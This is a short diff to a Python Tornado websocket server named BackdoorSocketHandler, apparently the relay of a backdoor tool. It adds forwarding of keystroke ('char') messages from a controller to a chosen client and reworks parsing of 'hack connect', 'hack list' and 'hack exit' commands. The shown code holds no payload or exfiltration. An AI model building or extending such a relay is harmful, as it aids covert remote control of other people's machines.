@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+import shlex
 from _docpot import docopt
 import tornado.web
 import tornado.websocket
@@ -86,6 +87,11 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                         to_controler.to_client_id = self.ID
                         to_controler.send_json(msg)
 
+            elif self.is_controller and 'char' in msg:
+                if self.to_client_id is not None and self.to_client_id in self.clients:
+                    to_client = self.clients[self.to_client_id]
+                    to_client.send_json(msg)
+
         else:
             # =====================
             # ======= Login =======
@@ -131,7 +137,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
             return
 
         try:
-            arguments_str = input_array[1:]
+            arguments_str = shlex.split(cmd)[1:]
             doc = """Usage:
   hack connect <client_id>
   hack (list | exit)
